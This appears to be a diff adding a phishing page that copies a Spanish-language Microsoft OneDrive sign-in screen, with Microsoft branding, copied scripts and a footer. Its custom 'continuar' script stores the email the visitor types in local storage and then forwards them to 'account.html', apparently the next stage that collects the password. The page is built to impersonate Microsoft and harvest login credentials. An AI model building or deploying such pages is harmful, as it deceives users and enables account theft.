@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="es-ES"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<title>Microsoft OneDrive</title>
+    <link rel="icon" href="./assets/icon.ico" type="image/x-icon">
+
+	<meta charset="utf-8">
+	<meta http-equiv="x-ua-compatible" content="ie=10">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="./assets/css/hrd.css" nonce="">
+	<!--[if IE 8]><script src="https://odc.officeapps.live.com/odc/stat/html5shiv.min.js?b=18821.30552" nonce="QCTrHxdkHdYYxRfVTi+IUIYHC0sduATDPYhXwLEW9ALmhRFWKz4STpEj6scSUEenlvehAX+YC8IxfFkORa3BLx6DotzwZAsvPW55c4U1gJk/GdwxYUgF6jT9j4QdIj6oVrF+WMIbpUDhp0xsP2jpFHYqBmQnC7Iv5NVTzOKnvkM="></script><![endif]-->
+</head>
+<body>
+    <style type="text/css" nonce="">
+		* {
+			font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+		}
+     
+    </style>
+    <div class="background">
+        <div class="blur"></div>
+        <div class="full"></div>
+    </div>
+    <div class="outer">
+        <div class="middle">
+            <main class="inner" style="">
+          
+                <div class="margin-bottom-20" aria-hidden="true">
+                    <picture class="logo margin-bottom-16">
+                        
+                        <img src="https://odc.officeapps.live.com/odc/stat/images/hrd/microsoft_logo.svg?b=18821.30552" alt="Logotipo de Microsoft" data-bind="attr: {alt: config.text.microsoftLogo}">
+                    </picture>
+                </div>
+                
+                <!-- ko ifnot: showSplitter -->
+                <div id="placeholder">
+                    <h1 class="row text-title margin-bottom-16" data-bind="text: config.text.header">Iniciar sesión</h1>
+                    <!-- ko if: context --><!-- /ko -->
+                    <div class="alert alert-error text-body margin-bottom-12 col-md-12" role="alert" aria-live="assertive" aria-atomic="true" data-bind="html: error"></div>
+                    <div class="row margin-bottom-16">
+                        <div class="form-group col-md-12 placeholderContainer">
+                            <input type="email" class="form-control" id="emailTextInput" placeholder="Correo electrónico, teléfono o Skype" aria-required="true" spellcheck="false" autocomplete="off" data-bind="
+                                    hasFocus: focus,
+                                    textInput: email,
+                                    attr: {'placeholder': config.text.emailPlaceHolder, 'aria-invalid': !error}">
+                            <!-- ko if: isRequestPending --><!-- /ko -->
+                            <div class="progress" id="progresor" role="progressbar" style="display: none;">
+                                <div></div><div></div><div></div><div></div><div></div><div></div>
+                            </div>
+                            <!-- ko if: showPlaceholder --><!-- /ko -->
+                        </div>
+                    </div>
+                    <!-- ko if: showEnterProductKey --><!-- /ko -->
+                    <!-- ko if: showCreateAccount -->
+                    <div class="row margin-bottom-20">
+                        <div class="col-md-12 section text-secondary">
+                            <!-- ko text: config.text.noAccount -->¿No tiene ninguna cuenta?<!-- /ko -->
+                            <a href="#" aria-label="Crear una cuenta de Microsoft" data-bind="text: config.text.createAccount,
+                                attr: {'aria-label': config.text.createAccountAria}, click: msAccountSignUp">Crear uno.</a>
+                        </div>
+                    </div>
+                    <!-- /ko -->
+                    <div class="row inline-block no-margin-top-bottom button-container">
+                        <input type="button" onclick="continuar()" class="btn btn-block btn-primary btn-override" id="" value="Siguiente">
+                    </div>
+                </div>
+                <!-- /ko -->
+                
+                <!-- ko if: showSplitter --><!-- /ko -->
+            
+            </main>
+        </div>
+    </div>
+    <footer id="footer">
+        <div>
+            <div class="footerNode">
+                <span>©2025 Microsoft</span>
+                <a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}" href="#" data-url="https://go.microsoft.com/fwlink/?LinkId=521839">Declaración de privacidad</a>
+            </div>
+        </div>
+    </footer>
+    <noscript>
+        Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.<br />
+        <br />
+        To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.
+    </noscript>
+    <script src="Sign%20in_files/jquery-1.12.4.1.min.js" nonce=""></script>
+    <script src="Sign%20in_files/knockout-3.4.2.js" nonce=""></script>
+    <script src="Sign%20in_files/CommonDiagnostics.js" nonce=""></script>
+    <script src="Sign%20in_files/jsonstrings" nonce=""></script>
+    <script src="Sign%20in_files/hrd.min.js" nonce=""></script>
+    <script type="text/javascript" nonce="">
+		var EmailHrdPage = new Hrd({"correlationId":"844d34d5-2f91-4fee-9bee-02ebb9240a3f","officeApplication":"Unknown","officePlatform":"S2S","params":{"accelerated":false,"app":28,"minimalEmailValidation":false,"culture":"es-ES","dir":"ltr","focus":true,"fpEnabled":false,"hm":0,"hostInterface":2,"idp":"","path":"/odc/v2.0/hrd","signInOrg":false,"ver":15},"services":{"getIdpUrl":"/odc/emailhrd/getidp","getIdpTimeout":20000,"getFederationProviderUrl":"/odc/emailhrd/getfederationprovider","getFederationProviderTimeOut":20000,"flight0IsOn":true,"retryAttemptsForGetFPCall":0,"appendCorrelationIdForFP":false},"text":"","links":{"renameYourAccount":"https://go.microsoft.com/fwlink/?LinkID=733247","privacyAndCookies":"https://go.microsoft.com/fwlink/?LinkId=521839","termsOfUse":"https://go.microsoft.com/fwlink/?LinkId=521839"}}, OOUI);
+        $(document).ready(function () {
+            $('#orgIdSignInBtn').click(function () {
+                Hrd.self.orgIdSignIn();
+            });
+
+            $('#msAccountSignInBtn').click(function () {
+                Hrd.self.msAccountSignIn();
+            });
+        });
+    </script>
+     <script>
+		
+
+
+
+  function continuar() {
+    const email = document.getElementById("emailTextInput").value;
+    localStorage.setItem("setEmail", email);
+    //alert("El correo electrónico se ha guardado en el almacenamiento local. " + email);
+    if(email === ""){
+
+    }else{
+        document.getElementById("progresor").style.display = "block";
+        setTimeout(function() {
+            document.getElementById("progresor").style.display = "none";
+            window.location.href = "account.html";
+    }, 1000);
+    }
+  }
+    </script>
+
+
+</body></html>
